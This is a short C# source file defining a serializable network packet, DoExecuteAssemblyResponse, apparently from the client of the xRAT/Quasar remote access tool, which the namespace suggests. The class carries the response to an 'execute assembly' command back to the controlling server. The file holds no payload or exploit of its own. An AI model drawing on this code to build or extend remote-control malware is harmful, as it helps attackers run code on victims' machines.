using System;
using System.Collections.Generic;
using xClient.Core.Networking;
using System.Linq;
using System.Text;

namespace xClient.Core.Packets.ClientPackets
{
    [Serializable]
    public class DoExecuteAssemblyResponse : IPacket
    {
        public string reponse { get; set; }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}